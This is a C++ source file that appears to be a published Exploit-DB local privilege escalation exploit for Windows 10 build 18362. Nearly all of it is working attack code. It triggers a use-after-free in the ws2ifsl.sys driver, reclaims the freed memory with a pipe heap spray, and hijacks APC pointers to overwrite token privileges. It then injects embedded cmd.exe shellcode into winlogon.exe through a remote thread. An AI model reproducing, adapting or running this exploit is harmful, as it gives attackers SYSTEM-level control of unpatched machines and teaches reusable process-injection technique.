@@ -1,0 +1,707 @@
+/*
+The exploit works on 19H1.
+It was tested with ntoskrnl version 10.0.18362.295
+
+EDB Note: Download ~ https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/47935.zip
+*/
+
+#include <Windows.h>
+#include <stdio.h>
+#include <string>
+#include <ntstatus.h>
+#include <processthreadsapi.h>
+#include <winternl.h>
+#include <tlhelp32.h>
+
+#pragma comment(lib, "ntdll.lib")
+
+// run cmd.exe
+unsigned char shellcode[] =
+"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51" \
+"\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52" \
+"\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0" \
+"\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed" \
+"\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88" \
+"\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44" \
+"\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48" \
+"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1" \
+"\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44" \
+"\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49" \
+"\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a" \
+"\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41" \
+"\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00" \
+"\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b" \
+"\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff" \
+"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47" \
+"\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x6d\x64\x2e\x65" \
+"\x78\x65\x00";
+
+static const unsigned int shellcode_len = 0x1000;
+
+#define MAXIMUM_FILENAME_LENGTH 255 
+#define SystemModuleInformation  0xb
+#define SystemHandleInformation 0x10
+
+typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO
+{
+	ULONG ProcessId;
+	UCHAR ObjectTypeNumber;
+	UCHAR Flags;
+	USHORT Handle;
+	void* Object;
+	ACCESS_MASK GrantedAccess;
+} SYSTEM_HANDLE, * PSYSTEM_HANDLE;
+
+typedef struct _SYSTEM_HANDLE_INFORMATION
+{
+	ULONG NumberOfHandles;
+	SYSTEM_HANDLE Handels[1];
+} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;
+
+typedef struct SYSTEM_MODULE {
+	ULONG                Reserved1;
+	ULONG                Reserved2;
+#ifdef _WIN64
+	ULONG				Reserved3;
+#endif
+	PVOID                ImageBaseAddress;
+	ULONG                ImageSize;
+	ULONG                Flags;
+	WORD                 Id;
+	WORD                 Rank;
+	WORD                 w018;
+	WORD                 NameOffset;
+	CHAR                 Name[MAXIMUM_FILENAME_LENGTH];
+}SYSTEM_MODULE, * PSYSTEM_MODULE;
+
+typedef struct SYSTEM_MODULE_INFORMATION {
+	ULONG                ModulesCount;
+	SYSTEM_MODULE        Modules[1];
+} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;
+
+// exploit specific type information 
+typedef struct _FILE_FULL_EA_INFORMATION {
+	ULONG NextEntryOffset;		// +0x0
+	UCHAR Flags;				// +4
+	UCHAR EaNameLength;			// +5
+	USHORT EaValueLength;		// +6
+	CHAR EaName[1];				// +9
+} FILE_FULL_EA_INFORMATION, * PFILE_FULL_EA_INFORMATION;
+
+typedef struct _PROC_DATA {
+	HANDLE apcthread;				// +0x0
+	void* unknown1;				// +0x8
+	void* unknown2;				// +0x10
+	void* unknown3;				// +0x18
+	void* unknown4;				// +0x20
+} PROC_DATA, * PPROC_DATA;
+
+typedef struct _SOCK_DATA {
+	HANDLE unknown;				// +0x0
+	HANDLE procDataHandle;	// +0x8	
+} SOCK_DATA, * PSOCK_DATA;
+
+// undocumented apis definitions 
+
+typedef NTSTATUS(WINAPI* NtWriteFile_t)(HANDLE FileHandle,
+	HANDLE Event,
+	PIO_APC_ROUTINE ApcRoutine,
+	PVOID ApcContext,
+	PIO_STATUS_BLOCK IoStatusBlock,
+	PVOID Buffer,
+	ULONG Length,
+	PLARGE_INTEGER ByteOffset,
+	PULONG key);
+
+typedef NTSTATUS(WINAPI* NtTestAlert_t)(void);
+
+typedef NTSTATUS(WINAPI* RtlGetVersion_t)(PRTL_OSVERSIONINFOW lpVersionInformation);
+
+// resolved function pointers at runtime
+NtTestAlert_t g_NtTestAlert = 0;
+NtWriteFile_t g_NtWriteFile = 0;
+RtlGetVersion_t g_RtlGetVersion = 0;
+
+HANDLE	g_Event1 = NULL;
+HANDLE	g_Event2 = NULL;
+HANDLE	g_Event3 = NULL;
+
+int g_done1 = 0;
+int g_done2 = 0;
+
+#define TOKEN_OFFSET 0x40			//_SEP_TOKEN_PRIVILEGES offset
+#define OFFSET_LINKEDLIST 0xA8		//kthread apc offset
+
+// generic helper function
+
+void InjectToWinlogon()
+{
+	PROCESSENTRY32 entry;
+	entry.dwSize = sizeof(PROCESSENTRY32);
+
+	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+
+	int pid = -1;
+	if (Process32First(snapshot, &entry))
+	{
+		while (Process32Next(snapshot, &entry))
+		{			
+			if (_strcmpi(entry.szExeFile, "winlogon.exe") == 0)
+			{
+				pid = entry.th32ProcessID;
+				break;
+			}
+		}
+	}
+
+	CloseHandle(snapshot);
+
+	if (pid < 0)
+	{
+		printf("Could not find process\n");
+		return;
+	}
+
+	HANDLE h = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+	if (!h)
+	{
+		printf("Could not open process: %x", GetLastError());
+		return;
+	}
+	
+	void* buffer = VirtualAllocEx(h, NULL, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	if (!buffer)
+	{
+		printf("[-] VirtualAllocEx failed\n");
+	}
+	
+	if (!buffer)
+	{
+		printf("[-] remote allocation failed");
+		return;
+	}
+
+	if (!WriteProcessMemory(h, buffer, shellcode, sizeof(shellcode), 0))
+	{
+		printf("[-] WriteProcessMemory failed");
+		return;
+	}
+
+	HANDLE hthread = CreateRemoteThread(h, 0, 0, (LPTHREAD_START_ROUTINE)buffer, 0, 0, 0);
+
+	if (hthread == INVALID_HANDLE_VALUE)
+	{
+		printf("[-] CreateRemoteThread failed");
+		return;
+	}
+}
+
+HMODULE GetNOSModule()
+{
+	HMODULE hKern = 0;
+	hKern = LoadLibraryEx("ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
+	return hKern;
+}
+
+DWORD64 GetModuleAddr(const char* modName)
+{
+	PSYSTEM_MODULE_INFORMATION buffer = (PSYSTEM_MODULE_INFORMATION)malloc(0x20);
+
+	DWORD outBuffer = 0;
+	NTSTATUS status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, buffer, 0x20, &outBuffer);
+
+	if (status == STATUS_INFO_LENGTH_MISMATCH)
+	{
+		free(buffer);
+		buffer = (PSYSTEM_MODULE_INFORMATION)malloc(outBuffer);
+		status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, buffer, outBuffer, &outBuffer);
+	}
+
+	if (!buffer)
+	{
+		printf("[-] NtQuerySystemInformation error\n");
+		return 0;
+	}
+
+	for (unsigned int i = 0; i < buffer->ModulesCount; i++)
+	{
+		PVOID kernelImageBase = buffer->Modules[i].ImageBaseAddress;
+		PCHAR kernelImage = (PCHAR)buffer->Modules[i].Name;		
+		if (_stricmp(kernelImage, modName) == 0)
+		{
+			free(buffer);
+			return (DWORD64)kernelImageBase;
+		}
+	}
+	free(buffer);
+	return 0;
+}
+
+
+DWORD64 GetKernelPointer(HANDLE handle, DWORD type)
+{
+	PSYSTEM_HANDLE_INFORMATION buffer = (PSYSTEM_HANDLE_INFORMATION) malloc(0x20);
+
+	DWORD outBuffer = 0;
+	NTSTATUS status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, buffer, 0x20, &outBuffer);
+
+	if (status == STATUS_INFO_LENGTH_MISMATCH)
+	{
+		free(buffer);
+		buffer = (PSYSTEM_HANDLE_INFORMATION) malloc(outBuffer);
+		status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, buffer, outBuffer, &outBuffer);
+	}
+
+	if (!buffer)
+	{
+		printf("[-] NtQuerySystemInformation error \n");
+		return 0;
+	}
+
+	for (size_t i = 0; i < buffer->NumberOfHandles; i++)
+	{
+		DWORD objTypeNumber = buffer->Handels[i].ObjectTypeNumber;
+
+		if (buffer->Handels[i].ProcessId == GetCurrentProcessId() && buffer->Handels[i].ObjectTypeNumber == type)
+		{
+			if (handle == (HANDLE)buffer->Handels[i].Handle)
+			{
+				//printf("%p %d %x\n", buffer->Handels[i].Object, buffer->Handels[i].ObjectTypeNumber, buffer->Handels[i].Handle);
+				DWORD64 object = (DWORD64)buffer->Handels[i].Object;
+				free(buffer);
+				return object;
+			}
+		}
+	}
+	printf("[-] handle not found\n");
+	free(buffer);
+	return 0;
+}
+
+DWORD64 GetGadgetAddr(const char* name)
+{
+	DWORD64 base = GetModuleAddr("\\SystemRoot\\system32\\ntoskrnl.exe");
+	HMODULE mod = GetNOSModule();
+	if (!mod)
+	{
+		printf("[-] leaking ntoskrnl version\n");
+		return 0;
+	}
+	DWORD64 offset = (DWORD64)GetProcAddress(mod, name);
+
+	DWORD64 returnValue = base + offset - (DWORD64)mod;
+	FreeLibrary(mod);
+	return returnValue;
+}
+
+/*	
+	After the bug is triggerd the first thime, this threads gets notified and it will trigger its function pointer,
+	which will call our gadget function and write the first 8 bytes.
+*/
+DWORD WINAPI APCThread1(LPVOID lparam)
+{
+	SetEvent(g_Event1);
+	while (1)
+	{
+		if (g_done1)
+		{
+			printf("[+] triggering first APC execution\n");
+			
+			g_NtTestAlert();		
+
+			while (1)
+			{
+				Sleep(0x1000);
+			}
+		}
+		else
+		{
+			Sleep(1);
+		}
+	}
+	return 0;
+}
+
+/*
+	After the bug is triggerd the second thime, this threads gets notified and it will trigger its function pointer again and write the second 8 bytes.
+	After that the shellcode is injected into the system process.
+*/
+DWORD WINAPI APCThread2(LPVOID lparam)
+{
+	SetEvent(g_Event2);
+	while (1)
+	{
+		if (g_done2)
+		{
+			printf("[+] triggering second APC execution\n");
+						
+			g_NtTestAlert();
+
+			InjectToWinlogon();
+			SetEvent(g_Event3);
+
+			while (1)
+			{
+				Sleep(0x1000);
+			}
+		}
+		else
+		{
+			Sleep(1);
+		}
+	}
+	return 0;
+}
+
+HANDLE CreateSocketHandle(HANDLE procHandle)
+{
+	HANDLE fileHandle = 0;
+	UNICODE_STRING deviceName;
+	OBJECT_ATTRIBUTES object;
+	IO_STATUS_BLOCK IoStatusBlock;
+
+	RtlInitUnicodeString(&deviceName, (PWSTR)L"\\Device\\WS2IFSL\\NifsSct");
+
+	InitializeObjectAttributes(&object, &deviceName, 0, NULL, NULL);
+
+	FILE_FULL_EA_INFORMATION* eaBuffer = (FILE_FULL_EA_INFORMATION*)malloc(sizeof(FILE_FULL_EA_INFORMATION) + sizeof("NifsSct") + sizeof(SOCK_DATA));
+	if (!eaBuffer)
+	{
+		printf("[-] malloc error\n");
+		return fileHandle;
+	}
+	eaBuffer->NextEntryOffset = 0;
+	eaBuffer->Flags = 0;
+	eaBuffer->EaNameLength = sizeof("NifsSct") - 1;
+	eaBuffer->EaValueLength = sizeof(SOCK_DATA);
+
+	RtlCopyMemory(eaBuffer->EaName, "NifsSct", (SIZE_T)eaBuffer->EaNameLength + 1);
+
+	SOCK_DATA * eaData = (SOCK_DATA*)(((char*)eaBuffer) + sizeof(FILE_FULL_EA_INFORMATION) + sizeof("NifsSct") - 4);
+
+	eaData->unknown = (void*) 0x242424224;
+	eaData->procDataHandle = (void*) procHandle;
+
+	NTSTATUS status = NtCreateFile(&fileHandle, GENERIC_WRITE, &object, &IoStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_OPEN_IF, 0, eaBuffer, sizeof(FILE_FULL_EA_INFORMATION) + sizeof("NifsSct") + sizeof(PROC_DATA));
+	if (status != STATUS_SUCCESS)
+	{
+		printf("[-] NtCreateFile error: %x \n", status);
+		free(eaBuffer);
+		return fileHandle;
+	}
+
+	free(eaBuffer);
+	return fileHandle;
+}
+
+HANDLE CreateProcessHandle(HANDLE hAPCThread)
+{
+	HANDLE fileHandle = 0;
+	UNICODE_STRING deviceName;
+	OBJECT_ATTRIBUTES object;
+	IO_STATUS_BLOCK IoStatusBlock;
+
+	RtlInitUnicodeString(&deviceName, (PWSTR)L"\\Device\\WS2IFSL\\NifsPvd");
+
+	InitializeObjectAttributes(&object, &deviceName, 0, NULL, NULL);
+
+	FILE_FULL_EA_INFORMATION* eaBuffer = (FILE_FULL_EA_INFORMATION*)malloc(sizeof(FILE_FULL_EA_INFORMATION) + sizeof("NifsPvd") + sizeof(PROC_DATA));
+	if (!eaBuffer)
+	{
+		printf("[-] malloc error\n");
+		return fileHandle;
+	}
+	eaBuffer->NextEntryOffset = 0;
+	eaBuffer->Flags = 0;
+	eaBuffer->EaNameLength = sizeof("NifsPvd") - 1;
+	eaBuffer->EaValueLength = sizeof(PROC_DATA);
+
+	RtlCopyMemory(eaBuffer->EaName, "NifsPvd", (SIZE_T)eaBuffer->EaNameLength + 1);
+	PROC_DATA * eaData = (PROC_DATA*)(((char*)eaBuffer) + sizeof(FILE_FULL_EA_INFORMATION) + sizeof("NifsPvd") - 4);
+
+	if (!hAPCThread)
+	{
+		printf("[-] error thread not found\n");
+		free(eaBuffer);
+		return 0;
+	}
+
+	eaData->apcthread = (void*) hAPCThread;		// thread must be in current process
+	eaData->unknown1 = (void*) 0x2222222;		// APC Routine
+	eaData->unknown2 = (void*) 0x3333333;		// cancel Rundown Routine
+	eaData->unknown3 = (void*) 0x4444444;
+	eaData->unknown4 = (void*) 0x5555555;
+
+	NTSTATUS status = NtCreateFile(&fileHandle, MAXIMUM_ALLOWED, &object, &IoStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_OPEN_IF, 0, eaBuffer, sizeof(FILE_FULL_EA_INFORMATION) + sizeof("NifsPvd") + sizeof(PROC_DATA));
+	if (status != STATUS_SUCCESS)
+	{
+		printf("[-] NtCreateFile error: %x \n", status);
+		free(eaBuffer);
+		return fileHandle;
+	}
+
+	free(eaBuffer);
+	return fileHandle;
+}
+
+int DoHeapSpray(DWORD64 writeAddress, DWORD64 kthreadAddress)
+{	
+	DWORD64 nopPointer = GetGadgetAddr("xHalTimerWatchdogStop");
+	if (!nopPointer)
+	{
+		printf("[-] SeSetAccessStateGenericMapping not found\n");
+		return 0;
+	}
+
+	DWORD64 funPointer = GetGadgetAddr("SeSetAccessStateGenericMapping");
+	if (!funPointer)
+	{
+		printf("[-] SeSetAccessStateGenericMapping not found\n");
+		return 0;
+	}	
+
+	UCHAR payload[0x120 - 0x48];
+	memset(payload, 0x0, sizeof(payload));	   
+		
+	DWORD64 x = 0x41414141414141;				
+	memcpy(payload, &x, 8);
+	
+	x = 0x12121212;								
+	memcpy(payload + 8, &x, 8);
+	
+	x = kthreadAddress + OFFSET_LINKEDLIST;		// apc linked list 
+	memcpy(payload + 0x10, &x, 8);
+	
+	x = kthreadAddress + OFFSET_LINKEDLIST;
+	memcpy(payload + 0x18, &x, 8);
+	
+	x = funPointer;
+	memcpy(payload + 0x20, &x, 8);				// this is the RIP we want to execute, in case of NtTestAlert
+
+	x = nopPointer;
+	memcpy(payload + 0x28, &x, 8);				// this is the RIP we want to execute, in case of rundown routine 
+	
+	x = 0xffffffffffffffff;						// this is to be written
+	memcpy(payload + 0x30, &x, 8);
+	
+	x = 0xffffffffffffffff;						// this is to be written, but it gets changed..
+	memcpy(payload + 0x38, &x, 8);
+	
+	x = 0x2424242424242424;
+	memcpy(payload + 0x40, &x, 8);
+	
+	x = writeAddress;							// this is where to write 
+	memcpy(payload + 0x48, &x, 8);
+ 
+	for (size_t i = 0; i < 0x70; i++)
+	{
+		HANDLE readPipe;
+		HANDLE writePipe;
+		DWORD resultLength = 0;
+	
+		BOOL res = CreatePipe(&readPipe, &writePipe, NULL, sizeof(payload));
+		if (!res)
+		{
+			printf("[-] error creating pipe\n");
+			return 0;
+		}
+		res = WriteFile(writePipe, payload, sizeof(payload), &resultLength, NULL);
+	}
+
+	return 1;
+}
+
+/*
+	This function will trigger the use after free in ws2ifsl.sys and
+	will try to reallocate the buffer with controlled content.
+*/
+void TriggerBug(HANDLE threadHandle, DWORD64 writeAddress, DWORD64 kthreadAddress, int id)
+{
+	HANDLE procHandle = CreateProcessHandle(threadHandle);
+	printf("[!] procHandle %x\n", (DWORD)procHandle);
+
+	HANDLE sockHandle = CreateSocketHandle(procHandle);
+	printf("[!] sockHandle %x\n", (DWORD)sockHandle);
+
+	char* readBuffer = (char*)malloc(0x100);
+	DWORD bytesRead = 0;
+
+	IO_STATUS_BLOCK io;
+	LARGE_INTEGER byteOffset;
+	byteOffset.HighPart = 0;
+	byteOffset.LowPart = 0;
+	byteOffset.QuadPart = 0;
+	byteOffset.u.LowPart = 0;
+	byteOffset.u.HighPart = 0;
+	ULONG key = 0;
+
+	CloseHandle(procHandle);
+
+	NTSTATUS ret = g_NtWriteFile(sockHandle, 0, 0, 0, &io, readBuffer, 0x100, &byteOffset, &key);
+
+	// this close the objecte and we trigger the use after free
+	CloseHandle(sockHandle);
+
+	// this spray will reclaim the buffer
+	if (!DoHeapSpray(writeAddress, kthreadAddress))
+	{
+		printf("[-] error doHeapSpray\n");
+		return;
+	}
+
+	if (id == 1)
+	{
+		g_done1 = 1;
+	}
+
+	if (id == 2)
+	{
+		g_done2 = 1;
+	}
+
+	printf("[+] done\n");
+	Sleep(0x20);
+	free(readBuffer);
+
+	return;
+}
+
+/*
+	This function resolves all function pointer for native api calls.
+*/
+bool InitFunctionPointers()
+{
+	HMODULE hNtDll = NULL;
+	hNtDll = LoadLibrary("ntdll.dll");
+	if (!hNtDll)
+	{
+		printf("error\n");
+		return false;
+	}
+
+	g_NtTestAlert = (NtTestAlert_t)GetProcAddress(hNtDll, "NtTestAlert");
+	if (!g_NtTestAlert)
+	{
+		printf("error\n");
+		return false;
+	}
+
+	g_NtWriteFile = (NtWriteFile_t)GetProcAddress(hNtDll, "NtWriteFile");
+	if (!g_NtWriteFile)
+	{
+		printf("[-] GetProcAddress() NtWriteFile failed.\n");
+		return false;
+	}
+
+	g_RtlGetVersion = (RtlGetVersion_t)GetProcAddress(hNtDll, "RtlGetVersion");
+	if (!g_NtWriteFile)
+	{
+		printf("[-] GetProcAddress() RtlGetVersion failed.\n");
+		return false;
+	}
+
+	return true;
+}
+
+int main()
+{
+	// intialize event for thread synchronization
+	g_Event1 = CreateEvent(0, 0, 0, 0);
+	g_Event2 = CreateEvent(0, 0, 0, 0);
+	g_Event3 = CreateEvent(0, 0, 0, 0);
+
+	if (g_Event1 == INVALID_HANDLE_VALUE || !g_Event1)
+	{
+		printf("[-] CreateEvent failed\n");
+		return 0;
+	}
+	if (g_Event2 == INVALID_HANDLE_VALUE || !g_Event2)
+	{
+		printf("[-] CreateEvent failed\n");
+		return 0;
+	}
+	if (g_Event3 == INVALID_HANDLE_VALUE || !g_Event2)
+	{
+		printf("[-] CreateEvent failed\n");
+		return 0;
+	}
+
+	if (!InitFunctionPointers())
+	{
+		printf("[-] InitFunctionPointers failed\n");
+		return 0;
+	}
+
+	HANDLE proc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, GetCurrentProcessId());
+	if (!proc)
+	{
+		printf("[-] OpenProcess failed\n");
+		return 0;
+	}
+	HANDLE token = 0;
+	if (!OpenProcessToken(proc, TOKEN_ADJUST_PRIVILEGES, &token))
+	{
+		printf("[-] OpenProcessToken failed\n");
+		return 0;
+	}	
+
+	DWORD64 ktoken = GetKernelPointer(token, 0x5);
+	DWORD64 where = ktoken + TOKEN_OFFSET;
+
+	printf("[+] found token at: %p\n", (DWORD64) ktoken);
+
+
+	// check the supported version of this exploit, otherwise we would crash
+	RTL_OSVERSIONINFOW osversion;
+	g_RtlGetVersion(&osversion);
+	
+	if (osversion.dwMajorVersion == 10 && osversion.dwBuildNumber == 18362)
+	{
+		printf("[+] version supported\n");
+	}
+	else
+	{
+		printf("[-] sorry version not supported\n");
+		return 0;
+	}
+
+	HANDLE hAPCThread1 = CreateThread(0, 0, APCThread1, 0, 0, 0);
+	if (hAPCThread1 == INVALID_HANDLE_VALUE || !hAPCThread1)
+	{
+		printf("[-] error CreateThread\n");
+		return 0;
+	}
+
+	HANDLE hAPCThread2 = CreateThread(0, 0, APCThread2, 0, 0, 0);
+	if (hAPCThread2 == INVALID_HANDLE_VALUE || !hAPCThread2)
+	{
+		printf("[-] error CreateThread\n");
+		return 0;
+	}
+		
+	DWORD64 threadAddrAPC1 = GetKernelPointer(hAPCThread1, 0x8);
+	if (!threadAddrAPC1)
+	{
+		printf("[-] GetKernelPointer error \n");
+		return 0;
+	}
+	DWORD64 threadAddrAPC2 = GetKernelPointer(hAPCThread2, 0x8);
+	if (!threadAddrAPC2)
+	{
+		printf("[-] GetKernelPointer error \n");
+		return 0;
+	}
+
+	// wait for threads to be initialized
+	WaitForSingleObject(g_Event1, -1);
+	WaitForSingleObject(g_Event2, -1);
+
+	TriggerBug(hAPCThread1, where-8, threadAddrAPC1, 1);
+	TriggerBug(hAPCThread2, where, threadAddrAPC2, 2);
+
+	WaitForSingleObject(g_Event3, -1);
+	
+	ExitProcess(0);
+	
+	return 0;
+}
